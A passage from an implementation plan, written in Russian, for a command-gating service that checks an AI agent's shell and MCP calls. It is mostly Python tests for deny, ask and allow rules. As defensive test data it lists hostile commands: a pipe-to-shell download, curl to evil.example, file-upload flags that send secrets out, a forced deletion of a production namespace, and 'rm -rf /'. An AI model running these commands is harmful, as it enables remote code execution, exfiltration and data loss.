    decision = await gate(classifier).decide(decide_request("git status", rules=rules(**ASK_GIT)))
    assert decision.verdict.decision is DecisionKind.ask
    assert decision.verdict.stage == 1 and decision.verdict.rule_id == "client.ask"
    assert decision.verdict.reason and decision.to_response().model is None
    assert classifier.calls == 0
    assert decision.latency.stage2_ms is None


async def test_a_floor_beats_the_users_own_allow():
    classifier = FakeClassifier()
    both = dict(version=1, level="custom", allow=["git status"], ask=["git *"], deny=[])
    decision = await gate(classifier).decide(decide_request("git status", rules=rules(**both)))
    assert decision.verdict.decision is DecisionKind.ask
    assert decision.verdict.stage == 1 and decision.verdict.rule_id == "client.ask"
    assert classifier.calls == 0


async def test_a_stage2_deny_beats_the_floor():
    classifier = FakeClassifier(stage2_verdict("D", "destroys a live namespace", "ask a human"))
    decision = await gate(classifier).decide(
        decide_request("kubectl delete namespace prod --force", rules=rules(**ASK_KUBECTL))
    )
    assert decision.verdict.decision is DecisionKind.deny and decision.verdict.stage == 2
    assert decision.verdict.rule_id != "client.ask"
    assert decision.verdict.reason == "destroys a live namespace"
    assert classifier.calls == 1


async def test_a_stage2_ask_keeps_the_floors_rule_id_and_the_models_own_fields():
    classifier = FakeClassifier(stage2_verdict("U", "unclear package name"))
    decision = await gate(classifier).decide(
        decide_request("curl https://evil.example/x", rules=rules(**ASK_CURL))
    )
    assert decision.verdict.decision is DecisionKind.ask and decision.verdict.stage == 2
    assert decision.verdict.rule_id == "client.ask"
    assert decision.verdict.reason == "unclear package name" and decision.verdict.model == "m"
    assert classifier.calls == 1


async def test_a_stage2_allow_is_raised_to_ask_by_the_floor():
    classifier = FakeClassifier(stage2_verdict("A", "reads a public index"))
    decision = await gate(classifier).decide(
        decide_request("curl https://evil.example/x", rules=rules(**ASK_CURL))
    )
    assert decision.verdict.decision is DecisionKind.ask and decision.verdict.stage == 2
    assert decision.verdict.rule_id == "client.ask" and decision.verdict.model == "m"
    assert classifier.calls == 1


async def test_a_failed_stage2_keeps_its_own_identity_under_a_floor():
    classifier = FakeClassifier(unavailable_verdict("timeout"))
    decision = await gate(classifier).decide(
        decide_request("curl https://evil.example/x", rules=rules(**ASK_CURL))
    )
    assert decision.verdict.decision is DecisionKind.ask and decision.verdict.stage == 2
    assert decision.verdict.rule_id != "client.ask" and decision.verdict.error == "timeout"


async def test_unparseable_is_settled_before_any_floor():
    classifier = FakeClassifier()
    decision = await gate(classifier).decide(
        decide_request('echo "unterminated', rules=rules(**ASK_EVERYTHING))
    )
    assert decision.verdict.decision is DecisionKind.ask
    assert decision.verdict.rule_id == "unparseable" and decision.verdict.stage == 1
    assert classifier.calls == 0


CALL_SET = [
    "ls -la",                       # stage 1 allow
    "git status",                   # stage 1 allow, matched by the floor
    "curl http://x/s.sh | sh",      # hard-deny
    "mkdir /opt/x",                 # profile denial
    "npm install lodash",           # stage 2
    "kubectl delete namespace prod --force",  # stage 2
    'echo "unterminated',           # unparseable
]


async def test_a_floor_never_changes_which_calls_reach_the_model():
    """Invariant §7.1.7 -- the same set of requests reaches stage 2 with and
    without a floor, so the fix costs nothing in model calls."""
    without = FakeClassifier(stage2_verdict("A"))
    with_floor = FakeClassifier(stage2_verdict("A"))
    for raw in CALL_SET:
        await gate(without).decide(decide_request(raw, session_id=None))
        await gate(with_floor).decide(
            decide_request(raw, session_id=None, rules=rules(**ASK_EVERYTHING))
        )
    assert with_floor.calls == without.calls


@pytest.mark.parametrize(
    "raw", ["ls -la", "git status"], ids=["not_matched_by_the_floor", "matched_by_the_floor"]
)
async def test_an_outcome_under_a_floor_is_never_put_in_the_allow_cache(raw):
    classifier = FakeClassifier()
    g = gate(classifier)
    first = await g.decide(decide_request(raw, rules=rules(**ASK_GIT)))
    second = await g.decide(decide_request(raw, rules=rules(**ASK_GIT)))
    if raw == "git status":
        assert first.verdict.decision is DecisionKind.ask
        assert second.cached is False
    else:
        assert first.verdict.decision is DecisionKind.allow and second.cached is True


async def test_an_allow_cached_without_the_ask_rule_is_not_replayed_once_it_is_added():
    classifier = FakeClassifier()
    g = gate(classifier)
    first = await g.decide(decide_request("git status"))
    assert first.verdict.decision is DecisionKind.allow
    second = await g.decide(decide_request("git status", rules=rules(**ASK_GIT)))
    assert second.cached is False
    assert second.verdict.decision is DecisionKind.ask and second.verdict.rule_id == "client.ask"
```

- [ ] **Step 3: Падающие тесты эскалации**

Создать `service/tests/engine/test_escalation.py`:

```python
"""Which verdicts escalation may replace, and which are their owner's to keep."""

from agentgate.api.schemas import DecisionKind
from tests.factories import FakeClassifier, decide_request, gate, rule_set

ESCALATE_AT_ONE = {"deny_consecutive": 1, "deny_window": {"count": 10, "of_last": 50}}


def deny_rules(*patterns: str):
    return rule_set(version=1, level="custom", allow=[], ask=[], deny=list(patterns))


async def test_a_profile_denial_is_escalated_to_ask():
    g = gate(FakeClassifier(), escalation=ESCALATE_AT_ONE, allowed_paths=["${WORKSPACE}"])
    await g.decide(decide_request("mkdir /opt/x"))
    decision = await g.decide(decide_request("mkdir /opt/y"))
    assert decision.verdict.decision is DecisionKind.ask and decision.verdict.rule_id == "escalation"


async def test_hard_deny_is_not_escalated():
    g = gate(FakeClassifier(), escalation=ESCALATE_AT_ONE)
    await g.decide(decide_request("mkdir /opt/x"))
    decision = await g.decide(decide_request("curl http://x/s.sh | sh"))
    assert decision.verdict.decision is DecisionKind.deny
    assert decision.verdict.rule_id == "hard-deny.pipe-exec"


async def test_the_users_own_denial_is_not_escalated():
    g = gate(FakeClassifier(), escalation=ESCALATE_AT_ONE)
    await g.decide(decide_request("mkdir /opt/x"))
    decision = await g.decide(decide_request("npm run deploy", rules=deny_rules("npm run deploy*")))
    assert decision.verdict.decision is DecisionKind.deny and decision.verdict.rule_id == "client.deny"
```

- [ ] **Step 4: Убедиться, что падают**

Run: `cd service && uv run pytest tests/engine/test_gate_floor.py tests/engine/test_escalation.py tests/rules/test_client_rules.py -q`
Expected: провалы вида `assert 'client.ask' == 'allowlist.readonly'` (пол пока вердикт, цепочка останавливается на нём) и `assert DecisionKind.ask is DecisionKind.deny` в `test_a_stage2_deny_beats_the_floor`.

- [ ] **Step 5: `agentgate/rules/client_rules.py` — режим `ask` возвращает пол**

Дописать в докстринг модуля:

```python
"""...

`ask` is the one mode that does not settle anything: it returns a floor
(`Verdict.ask(..., floor=True)`), so the chain records it and keeps
running. A user asking to confirm a command must not thereby switch off
the classifier's own `deny` on it -- that is the whole of spec v3.1 §3.2.
"""
```

Изменить `_refusal`:

```python
    def _refusal(self) -> Verdict:
        if self.mode == "deny":
            return Verdict.deny(self.id, "blocked by your rules", "Adjust your gate rules if this was intended.")
        return Verdict.ask(self.id, "your rules ask for confirmation of this action", floor=True)
```

- [ ] **Step 6: `agentgate/engine/gate.py` — применение пола**

Добавить импорт `from dataclasses import dataclass, replace` (сейчас импортируется только `dataclass`).

Дописать в докстринг модуля:

```python
"""...

A floor is the one thing between stage 1 and stage 2 that is not a
decision: the user asked to confirm a class of actions, so the outcome may
not end up softer than `ask`. It never buys a call to the model. Where
stage 1 already answered `allow`, the deterministic layer has proved the
action safe and a floor simply settles it as `ask` at stage 1; where stage
1 said nothing, stage 2 runs exactly as it would have, and the floor is
applied to its verdict afterwards.
"""
```

Заменить `_evaluate` и `_escalate` и добавить два модульных помощника в конец файла:

```python
    async def _evaluate(
        self, request: DecideRequest, action: NormalizedAction, dialogue: Dialogue,
        context: _Context, timings: Timings,
    ) -> tuple[Verdict, Dialogue | None]:
        """The verdict, and the dialogue the classifier saw -- None when stage 1 settled it."""
        with timings.stage(1):
            outcome = self._rules.run(action, context.policy)
        settled = _settled_at_stage1(outcome)
        if settled is not None:
            return settled, None
        with timings.stage(2):
            case = ReviewCase.build(action, request.user_request, dialogue, context.policy, STAGE1_PASSED)
            verdict = await context.classifier.classify(case)
        return _under_floor(verdict, outcome.floor), case.dialogue

    def _escalate(self, state: SessionState | None, policy: Policy, verdict: Verdict) -> Verdict:
        if state is None or not verdict.escalatable or verdict.decision is DecisionKind.ask:
            return verdict
        if not should_escalate(state, policy.escalation):
            return verdict
        hits = state.deny_consecutive
        state.reset_after_escalation()
        return verdict.escalated(hits)
```

```python
def _settled_at_stage1(outcome: ChainOutcome) -> Verdict | None:
    """What stage 1 answers once its floor is taken into account.

    A stage-1 verdict at least as strict as the floor stands as it is --
    that is every denial, all of which sit above the floor in the chain. An
    `allow` under a floor becomes the floor itself, at stage 1 and with no
    model call: the deterministic layer has already proved the action safe,
    so nothing stricter than `ask` could honestly come back from stage 2.
    """
    if outcome.verdict is None:
        return None
    if outcome.floor is None or outcome.verdict.strictness >= outcome.floor.strictness:
        return outcome.verdict
    return replace(outcome.floor, floor=False)


def _under_floor(verdict: Verdict, floor: Verdict | None) -> Verdict:
    """A stage-2 verdict raised to the floor, keeping everything the model
    actually produced.

    Only the decision and the rule_id move: the reason, the model, the
    stage-2 latency and the cost belong to the call that was made and paid
    for. A verdict that failed closed keeps its own identity -- it is
    already an `ask`, and relabelling it `client.ask` would hide that the
    classifier never answered.
    """
    if floor is None or verdict.error is not None or verdict.strictness > floor.strictness:
        return verdict
    return replace(verdict, decision=floor.decision, rule_id=floor.rule_id)
```

Импорт цепочки: `from agentgate.rules.base import ChainOutcome, RuleChain`.

- [ ] **Step 7: Тесты проходят**

Run: `cd service && uv run pytest tests/engine tests/rules -q`
Expected: PASS. Ожидаемо чувствительные к порядку файлы — `tests/rules/test_chain.py` и `tests/engine/test_gate.py`; в них ничего меняться не должно, потому что без `rules` пола нет.

- [ ] **Step 8: Полный прогон и контракт**

Run: `cd service && <FULL> && git diff --exit-code ../contracts`
Expected: PASS, контракты без diff.

- [ ] **Step 9: Коммит**

```bash
git commit --only service/agentgate/rules/client_rules.py service/agentgate/engine/gate.py service/tests/rules/test_client_rules.py service/tests/engine/test_gate_floor.py service/tests/engine/test_escalation.py -m "feat(engine): the user's ask is a floor, not a verdict — it raises an outcome and never buys a model call

Co-Authored-By: Claude Fable 5.1 <noreply@anthropic.com>"
```

---

### Task 4: MCP в клиентских правилах

Закрывает §4.1 (канонический вид `server.tool`, ветка `_allow`, `arguments` вне матчинга, документированное ограничение по `/`). Зависит от задачи 2 (фабрика `mcp_action`).

**Files:**
- Modify: `service/agentgate/rules/client_rules.py`
- Test: `service/tests/rules/test_client_rules.py`

- [ ] **Step 1: Падающие тесты**

Дописать в `service/tests/rules/test_client_rules.py` (в верхний блок импортов добавить `mcp_action`):

```python
def test_canonical_units_of_an_mcp_call_are_one_string_twice():
    units, singles = canonical_units(mcp_action("github", "get_issue"))
    assert units == ["github.get_issue"] and singles == ["github.get_issue"]


def test_canonical_units_of_an_mcp_call_ignore_the_arguments():
    with_args = canonical_units(mcp_action("github", "get_issue", {"repo": "org/x", "id": 7}))
    assert with_args == canonical_units(mcp_action("github", "get_issue"))


@pytest.mark.parametrize(
    ("server", "tool", "rules", "expected", "rule_id"),
    [
        ("github", "get_issue", dict(allow=["github.get_*"]), DecisionKind.allow, "client.allow"),
        ("github", "delete_repo", dict(deny=["*.delete_*"]), DecisionKind.deny, "client.deny"),
        ("github", "create_pr", dict(allow=["github.get_*"]), None, None),
        ("github", "get_issue", dict(allow=["github.*"]), DecisionKind.allow, "client.allow"),
        ("filesystem", "write_file", dict(deny=["filesystem.write_file"]), DecisionKind.deny, "client.deny"),
        ("github", "Get_Issue", dict(allow=["github.get_*"]), None, None),
    ],
    ids=[
        "allow_prefix_glob", "deny_across_servers", "allow_no_match",
        "allow_whole_server", "deny_exact", "case_is_not_folded",
    ],
)
def test_client_rules_on_mcp_calls(server, tool, rules, expected, rule_id):
    verdict = STAGE1.evaluate(mcp_action(server, tool), policy_with(**rules))
    if expected is None:
        assert verdict is None or not verdict.rule_id.startswith("client.")
    else:
        assert verdict is not None and verdict.decision is expected and verdict.rule_id == rule_id


def test_an_mcp_ask_pattern_is_a_floor_like_any_other():
    outcome = STAGE1.run(mcp_action("github", "create_pr"), policy_with(ask=["github.create_*"]))
    assert outcome.verdict is None
    assert outcome.floor is not None and outcome.floor.rule_id == "client.ask"


def test_an_mcp_allow_does_not_depend_on_the_arguments():
    with_args = STAGE1.evaluate(
        mcp_action("github", "get_issue", {"body": "rm -rf /"}), policy_with(allow=["github.get_*"])
    )
    assert with_args is not None and with_args.rule_id == "client.allow"


def test_a_server_name_with_a_slash_falls_into_the_path_patterns_and_never_matches():
    # Documented limitation, spec v3.1 §4.1: `is_path_pattern` reads a `/` as
    # "this is a path", so such a pattern is matched against paths an MCP call
    # does not have. Not validated away -- a user's pattern is not required to
    # match anything -- but written down in contracts/README.md and connect.md.
    verdict = STAGE1.evaluate(mcp_action("org/github", "get_issue"), policy_with(deny=["org/github.*"]))
    assert verdict is None or not verdict.rule_id.startswith("client.")


def test_an_mcp_call_with_no_matching_rule_is_left_to_stage_two():
    assert STAGE1.evaluate(mcp_action("github", "create_pr"), stage1_policy()) is None
```

- [ ] **Step 2: Убедиться, что падают**

Run: `cd service && uv run pytest tests/rules/test_client_rules.py -q`
Expected: `assert [] == ['github.get_issue']` в `test_canonical_units_of_an_mcp_call_are_one_string_twice`.

- [ ] **Step 3: Реализация в `agentgate/rules/client_rules.py`**

Дописать в докстринг модуля:

```python
"""...

An MCP call has one canonical form, `server.tool` (`github.get_issue`),
exactly as it arrives in `McpArgs`. It is not compound, so the "units" and
the "singles" are the same single string. Case is not folded -- MCP tool
names are case-sensitive -- and the call's `arguments` never take part in
matching: they are arbitrary JSON, and globbing their serialization would
be deciding on untrusted text.
"""
```

Заменить `canonical_units` и добавить ветку в `_allow`:

```python
def canonical_units(action: NormalizedAction) -> tuple[list[str], list[str]]:
    """Pipelines as one string each, and every single command on its own.

    An MCP call is neither: it is one `server.tool` string, returned as
    both, because there is nothing compound to take apart.
    """
    if action.tool is Tool.mcp_call:
        return (_mcp_units(action), _mcp_units(action))
    by_pipeline: dict[int, list[str]] = {}
    for command in action.commands:
        by_pipeline.setdefault(command.pipeline_id, []).append(" ".join(command.argv))
    units = [" | ".join(parts) for parts in by_pipeline.values()]
    singles = [" ".join(command.argv) for command in action.commands]
    return units, singles


def _mcp_units(action: NormalizedAction) -> list[str]:
    if action.mcp is None:
        return []
    return [f"{action.mcp.server}.{action.mcp.tool}"]
```

В `_allow` — явная ветка для MCP перед общей ветвью «не shell»:

```python
    def _allow(self, action: NormalizedAction, rules: ClientRules) -> Verdict | None:
        if action.tool is Tool.mcp_call:
            # No eval, no substitution, no redirect to refuse: an MCP call
            # is a name and a JSON body, and only the name is matched.
            units, _ = canonical_units(action)
            if units and all(rules.matches_command("allow", u) for u in units):
                return Verdict.allow(self.id)
            return None
        if action.tool is not Tool.shell:
            ...
```

(остальное тело `_allow` не меняется).

- [ ] **Step 4: Тесты проходят**

Run: `cd service && uv run pytest tests/rules/test_client_rules.py -q`
Expected: PASS.

- [ ] **Step 5: Полный прогон и контракт**

Run: `cd service && <FULL> && git diff --exit-code ../contracts`
Expected: PASS, без diff.

- [ ] **Step 6: Коммит**

```bash
git commit --only service/agentgate/rules/client_rules.py service/tests/rules/test_client_rules.py -m "feat(rules): the user's rules match an MCP call by server.tool, never by its arguments

Co-Authored-By: Claude Fable 5.1 <noreply@anthropic.com>"
```

---

### Task 5: `ProfileMcpRule` и `McpReadonlyRule`

Закрывает §4.2 (семантика секции), §4.3 (правило и его позиция), §4.4 (readonly-префиксы), §5.3 в части двух строк `STAGE1`. Зависит от задачи 2.

**Files:**
- Create: `service/agentgate/rules/profile_mcp.py`, `service/agentgate/rules/mcp_readonly.py`, `service/tests/rules/test_profile_mcp.py`, `service/tests/rules/test_mcp_readonly.py`
- Modify: `service/agentgate/rules/chain.py`
- Test: `service/tests/rules/test_chain.py`

- [ ] **Step 1: Падающие тесты `ProfileMcpRule`**

Создать `service/tests/rules/test_profile_mcp.py`:

```python
import pytest

from agentgate.api.schemas import DecisionKind
from agentgate.rules.profile_mcp import ProfileMcpRule
from tests.factories import mcp_action, mcp_policy, shell_action, stage1_policy

RULE = ProfileMcpRule()
POLICY = mcp_policy(
    allow=["github.get_*", "github.list_*"],
    ask=["github.create_*"],
    deny=["*.delete_*", "shell.*"],
)


@pytest.mark.parametrize(
    ("server", "tool", "expected", "rule_id"),
    [
        ("github", "get_issue", DecisionKind.allow, "profile.mcp-allow"),
        ("github", "list_repos", DecisionKind.allow, "profile.mcp-allow"),
        ("github", "create_pr", DecisionKind.ask, "profile.mcp-ask"),
        ("github", "delete_repo", DecisionKind.deny, "profile.mcp-deny"),
        ("shell", "run", DecisionKind.deny, "profile.mcp-deny"),
        ("notes", "append", None, None),
    ],
    ids=["allow_get", "allow_list", "ask_create", "deny_delete", "deny_whole_server", "no_match"],
)
def test_the_operators_mcp_lists(server, tool, expected, rule_id):
    verdict = RULE.evaluate(mcp_action(server, tool), POLICY)
    if expected is None:
        assert verdict is None
    else:
        assert verdict is not None and verdict.decision is expected and verdict.rule_id == rule_id


def test_deny_wins_over_ask_and_allow_when_several_lists_match():
    policy = mcp_policy(allow=["github.*"], ask=["github.*"], deny=["github.*"])
    assert RULE.evaluate(mcp_action("github", "get_issue"), policy).rule_id == "profile.mcp-deny"


def test_ask_wins_over_allow_when_both_match():
    policy = mcp_policy(allow=["github.*"], ask=["github.get_*"])
    assert RULE.evaluate(mcp_action("github", "get_issue"), policy).rule_id == "profile.mcp-ask"


@pytest.mark.parametrize(
    ("server", "tool"),
    [
        ("GitHub", "Get_Issue"),
        ("githυb", "get_issue"),   # Greek upsilon in place of `u`
        ("github", "get-issue"),
        ("github ", "get_issue"),
        ("github", "delete_repo".upper()),
    ],
    ids=["case", "homoglyph", "dash_instead_of_underscore", "trailing_space", "uppercase_delete"],
)
def test_an_obfuscated_name_is_not_matched_and_falls_through_to_stage_two(server, tool):
    # A near-miss must not silently become allow, and must not silently become
    # deny either: the rule says nothing and stage 2 sees the call.
    assert RULE.evaluate(mcp_action(server, tool), POLICY) is None


def test_an_empty_mcp_section_says_nothing():
    assert RULE.evaluate(mcp_action("github", "delete_repo"), stage1_policy()) is None


def test_a_shell_action_is_none_of_this_rules_business():
    assert RULE.evaluate(shell_action("rm -rf ./dist"), POLICY) is None
```

- [ ] **Step 2: Падающие тесты `McpReadonlyRule`**

Создать `service/tests/rules/test_mcp_readonly.py`:

```python
import pytest

from agentgate.rules.mcp_readonly import READONLY_PREFIXES, McpReadonlyRule
from tests.factories import mcp_action, mcp_policy, shell_action, stage1_policy

RULE = McpReadonlyRule()
ON = mcp_policy(readonly_prefixes_allow=True)


@pytest.mark.parametrize("tool", sorted(f"{p}thing" for p in READONLY_PREFIXES))
def test_every_declared_prefix_is_allowed_when_the_flag_is_on(tool):
    verdict = RULE.evaluate(mcp_action("github", tool), ON)
    assert verdict is not None and verdict.rule_id == "allowlist.mcp-readonly"


@pytest.mark.parametrize(
    "tool",
    ["getIssue", "delete_get_thing", "Get_issue", "fetch_issue", "get", "readme"],
    ids=["camel_case", "prefix_not_at_the_start", "wrong_case", "undeclared_prefix", "bare_prefix_without_underscore", "prefix_as_a_substring"],
)
def test_a_name_that_is_not_a_declared_prefix_is_not_allowed(tool):
    assert RULE.evaluate(mcp_action("github", tool), ON) is None


@pytest.mark.parametrize("tool", ["get_issue", "list_repos", "read_file"])
def test_the_rule_is_silent_while_the_flag_is_off(tool):
    assert RULE.evaluate(mcp_action("github", tool), stage1_policy()) is None


def test_a_shell_action_is_none_of_this_rules_business():
    assert RULE.evaluate(shell_action("ls -la"), ON) is None
```

- [ ] **Step 3: Падающие тесты цепочки**

Дописать в `service/tests/rules/test_chain.py`:

```python
def test_an_operator_denial_of_an_mcp_call_beats_a_users_ask():
    from tests.factories import mcp_action, mcp_policy
    from agentgate.domain.client_rules import ClientRules
    from agentgate.domain.policy import Policy
    from tests.factories import WORKSPACE, rule_set

    base = mcp_policy(deny=["*.delete_*"])
    policy = Policy.bind(
        base.profile, WORKSPACE,
        ClientRules.of(rule_set(version=1, level="custom", allow=[], ask=["*"], deny=[])),
    )
    outcome = STAGE1.run(mcp_action("github", "delete_repo"), policy)
    assert outcome.verdict.rule_id == "profile.mcp-deny" and outcome.floor is None


def test_an_operator_allow_of_an_mcp_call_sits_above_the_readonly_convention():
    from tests.factories import mcp_action, mcp_policy

    policy = mcp_policy(ask=["github.get_*"], readonly_prefixes_allow=True)
    assert STAGE1.evaluate(mcp_action("github", "get_issue"), policy).rule_id == "profile.mcp-ask"
```

- [ ] **Step 4: Убедиться, что падают**

Run: `cd service && uv run pytest tests/rules/test_profile_mcp.py tests/rules/test_mcp_readonly.py tests/rules/test_chain.py -q`
Expected: `ModuleNotFoundError: No module named 'agentgate.rules.profile_mcp'`.

- [ ] **Step 5: `agentgate/rules/profile_mcp.py`**

```python
"""MCP calls against the operator's own lists.

`server.tool` (`github.get_issue`) is matched with `fnmatch.fnmatchcase`
against `mcp.deny`, `mcp.ask` and `mcp.allow`, in that order: when several
lists match, the strictest wins, and it is one check in one rule rather
than three positions in the chain.

There is deliberately no hard-deny here. A name proves nothing:
`filesystem.write_file` may be a sandbox, and `notes.append` may be a
write into `~/.ssh/authorized_keys`. Hard-deny means "never, under any
circumstances", and no such claim can be built on a name alone.

The call's `arguments` are never read.
"""

import fnmatch

from agentgate.api.schemas import Tool
from agentgate.domain.policy import Policy
from agentgate.domain.verdict import Verdict
from agentgate.normalize.model import NormalizedAction


def mcp_name(action: NormalizedAction) -> str | None:
    """`server.tool` of an MCP call, or None for anything else."""
    if action.tool is not Tool.mcp_call or action.mcp is None:
        return None
    return f"{action.mcp.server}.{action.mcp.tool}"


class ProfileMcpRule:
    id = "profile.mcp"
    hard = False

    def evaluate(self, action: NormalizedAction, policy: Policy) -> Verdict | None:
        name = mcp_name(action)
        if name is None:
            return None
        mcp = policy.mcp
        if _matches(name, mcp.deny):
            return Verdict.deny(
                "profile.mcp-deny", f"MCP tool {name} is denied by the profile",
                "Ask the operator to extend the profile's mcp.allow if this was intended",
            )
        if _matches(name, mcp.ask):
            return Verdict.ask("profile.mcp-ask", f"MCP tool {name} needs confirmation by the profile")
        if _matches(name, mcp.allow):
            return Verdict.allow("profile.mcp-allow")
        return None


def _matches(name: str, patterns: list[str]) -> bool:
    return any(fnmatch.fnmatchcase(name, p) for p in patterns)
```

- [ ] **Step 6: `agentgate/rules/mcp_readonly.py`**

```python
"""The naming convention for MCP tools that only read.

Off unless the operator turns it on (`mcp.readonly_prefixes_allow`),
because a prefix is a convention and not a proof. When it is on, a tool
name beginning with one of the prefixes below is allowed outright.

The prefixes are a module constant and will not become a profile field.
An operator who needs their own list already has one: `mcp.allow` with
globs (`github.get_*`, `*.fetch_*`) says the same thing and says it more
precisely, because it is bound to a server. A second way to say it would
only raise the question of which of the two lists is stronger.

This rule sits below everything the operator and the user wrote by hand,
because it is a server convenience, not anyone's policy.
"""

from agentgate.domain.policy import Policy
from agentgate.domain.verdict import Verdict
from agentgate.normalize.model import NormalizedAction
from agentgate.rules.profile_mcp import mcp_name

READONLY_PREFIXES: tuple[str, ...] = ("get_", "list_", "search_", "read_", "describe_")


class McpReadonlyRule:
    id = "allowlist.mcp-readonly"
    hard = False

    def evaluate(self, action: NormalizedAction, policy: Policy) -> Verdict | None:
        if not policy.mcp.readonly_prefixes_allow:
            return None
        name = mcp_name(action)
        if name is None or action.mcp is None:
            return None
        if action.mcp.tool.startswith(READONLY_PREFIXES):
            return Verdict.allow(self.id)
        return None
```

- [ ] **Step 7: `agentgate/rules/chain.py` — две строки**

```python
from agentgate.rules.allowlist import AllowlistRule
from agentgate.rules.base import RuleChain
from agentgate.rules.client_rules import ClientRulesRule
from agentgate.rules.hard_deny import HARD_DENY_RULES
from agentgate.rules.hard_deny.wrapper_unresolved import WrapperUnresolvedRule
from agentgate.rules.mcp_readonly import McpReadonlyRule
from agentgate.rules.packages import PackagesRule
from agentgate.rules.profile_domains import ProfileDomainRule
from agentgate.rules.profile_mcp import ProfileMcpRule
from agentgate.rules.profile_paths import ProfilePathRule
from agentgate.rules.unparseable import UnparseableRule

STAGE1 = RuleChain([
    UnparseableRule(),
    *HARD_DENY_RULES,
    WrapperUnresolvedRule(),
    ClientRulesRule("deny"),
    ProfilePathRule(),
    ProfileDomainRule(),
    ProfileMcpRule(),
    ClientRulesRule("ask"),
    ClientRulesRule("allow"),
    AllowlistRule(),
    McpReadonlyRule(),
    PackagesRule(),
])
```

Докстринг модуля дополнить абзацем:

```python
"""...

`ProfileMcpRule` stands with the profile's other denials, above the user's
`ask` floor, so an operator's `deny` on an MCP tool cannot be softened by
it -- and, by the same position, an operator's `allow` on one is settled as
`ask` at stage 1 when the user asked to confirm. `McpReadonlyRule` sits
just below the server allowlist: it is a naming convention, so it yields to
everything the operator and the user wrote by hand.
"""
```

- [ ] **Step 8: Тесты проходят**

Run: `cd service && uv run pytest tests/rules -q`
Expected: PASS.

- [ ] **Step 9: Полный прогон и контракт**

Run: `cd service && <FULL> && git diff --exit-code ../contracts`
Expected: PASS, без diff (схема профиля уже перегенерирована в задаче 2).

- [ ] **Step 10: Коммит**

```bash
git commit --only service/agentgate/rules/profile_mcp.py service/agentgate/rules/mcp_readonly.py service/agentgate/rules/chain.py service/tests/rules/test_profile_mcp.py service/tests/rules/test_mcp_readonly.py service/tests/rules/test_chain.py -m "feat(rules): stage 1 judges an MCP call — the operator's lists, and a readonly convention behind a flag

Co-Authored-By: Claude Fable 5.1 <noreply@anthropic.com>"
```

---

### Task 6: `ProfileDomainTrustedRule`

Закрывает §5.1 (что не меняется), §5.2 (одиннадцать условий), §5.3 (позиция). Зависит от задачи 2.

**Files:**
- Create: `service/agentgate/rules/profile_domain_trusted.py`, `service/tests/rules/test_profile_domain_trusted.py`
- Modify: `service/agentgate/rules/chain.py`
- Test: `service/tests/rules/test_chain.py`, `service/tests/rules/test_latency.py`

- [ ] **Step 1: Падающие тесты правила**

Создать `service/tests/rules/test_profile_domain_trusted.py`:

```python
"""One test per condition of spec v3.1 §5.2, in its refusing form, plus the
positives the rule exists for. `None` means "the rule said nothing", which
is the only shape a refusal takes here: this rule never denies.
"""

import pytest

from agentgate.rules.profile_domain_trusted import ProfileDomainTrustedRule
from tests.factories import mcp_action, shell_action, stage1_policy, trusted_policy, unparseable_action

RULE = ProfileDomainTrustedRule()
TRUSTED = trusted_policy()


@pytest.mark.parametrize(
    "raw",
    [
        "curl https://pypi.org/simple/",
        "curl -sSL https://pypi.org/simple/",
        "git fetch https://github.com/org/repo",
        "curl https://files.pypi.org/x",
        "curl https://pypi.org/a && curl https://github.com/b",
        "curl https://pypi.org/simple/ | head -5",
    ],
    ids=["plain_get", "with_flags", "git_fetch", "subdomain", "two_trusted_domains", "piped_into_a_reader"],
)
def test_a_read_from_a_trusted_domain_is_allowed(raw):
    verdict = RULE.evaluate(shell_action(raw), TRUSTED)
    assert verdict is not None and verdict.rule_id == "profile.domain-trusted"
    assert verdict.decision.value == "allow"


@pytest.mark.parametrize(
    ("raw", "policy_kwargs"),
    [
        # 1. the flag and the mode
        ("curl https://pypi.org/simple/", dict(mode="open")),
        ("curl https://pypi.org/simple/", dict(mode="off")),
        # 4. every domain must be listed, and the list must not be empty
        ("curl https://evil.sh/x", {}),
        ("curl https://pypi.org/a && curl https://evil.sh/b", {}),
        ("curl https://pypi.org/simple/", dict(domains=())),
    ],
    ids=["mode_open", "mode_off", "domain_not_listed", "one_domain_of_two_not_listed", "empty_allowlist"],
)
def test_the_rule_is_silent_when_the_network_policy_does_not_authorize_it(raw, policy_kwargs):
    assert RULE.evaluate(shell_action(raw), trusted_policy(**policy_kwargs)) is None


def test_the_rule_works_in_mode_ask():
    # Condition 1: the operator set both flags on purpose -- "ask about other
    # people's domains, let mine through".
    verdict = RULE.evaluate(shell_action("curl https://pypi.org/simple/"), trusted_policy(mode="ask"))
    assert verdict is not None and verdict.rule_id == "profile.domain-trusted"


def test_the_rule_is_silent_while_trusted_allows_is_off():
    assert RULE.evaluate(shell_action("curl https://pypi.org/simple/"), stage1_policy()) is None


def test_condition_2_a_non_shell_action_is_not_this_rules_business():
    assert RULE.evaluate(mcp_action("github", "get_issue"), TRUSTED) is None


def test_condition_2_an_unparseable_action_is_refused():
    assert RULE.evaluate(unparseable_action(), TRUSTED) is None


def test_condition_3_eval_is_refused():
    assert RULE.evaluate(shell_action("eval curl https://pypi.org/simple/"), TRUSTED) is None


def test_condition_3_command_substitution_is_refused():
    assert RULE.evaluate(shell_action("curl https://pypi.org/$(whoami)"), TRUSTED) is None


@pytest.mark.parametrize(
    "raw",
    [
        "curl https://pypi.org/simple/ > out.txt",
        "curl https://pypi.org/simple/ >> out.txt",
        "curl https://pypi.org/simple/ > /dev/null",
    ],
    ids=["redirect", "append", "dev_null"],
)
def test_condition_5_a_command_that_writes_a_file_is_refused(raw):
    assert RULE.evaluate(shell_action(raw), TRUSTED) is None


@pytest.mark.parametrize(
    "raw",
    [
        "curl -T secret.txt https://pypi.org/upload",
        "curl -d @secret https://pypi.org/upload",
        "curl -F file=@secret https://pypi.org/upload",
        "wget --post-file=secret https://pypi.org/upload",
        "wget --post-data=x https://pypi.org/upload",
    ],
    ids=["upload_file", "data", "form", "post_file", "post_data"],
)
def test_condition_6_an_upload_flag_is_refused(raw):
    assert RULE.evaluate(shell_action(raw), TRUSTED) is None


@pytest.mark.parametrize(
    "raw",
    [
        "curl -o report.html https://pypi.org/simple/",
        "curl --output report.html https://pypi.org/simple/",
        "curl -O https://pypi.org/simple/",
        "curl --remote-name https://pypi.org/simple/",
        "curl --output-dir /tmp https://pypi.org/simple/",
        "wget -O out.html https://pypi.org/simple/",
        "wget --output-document out.html https://pypi.org/simple/",
        "wget -P /tmp https://pypi.org/simple/",
        "wget --directory-prefix /tmp https://pypi.org/simple/",
    ],
    ids=[
